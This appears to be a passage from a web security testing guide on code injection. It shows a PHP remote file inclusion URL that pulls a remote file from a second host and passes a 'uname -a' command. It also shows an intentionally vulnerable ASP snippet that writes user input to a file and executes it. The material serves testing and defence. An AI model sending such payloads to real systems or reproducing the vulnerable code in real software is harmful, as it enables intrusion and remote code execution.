# Black-Box Testing

## Testing for PHP Injection Vulnerabilities

Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:

`http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.
# Gray-Box Testing

## Testing for ASP Code Injection Vulnerabilities

Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```

# References

- [Security Focus](http://www.securityfocus.com)
- [Insecure.org](http://www.insecure.org)
- [Wikipedia](http://www.wikipedia.org)
- [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/OS_Injection)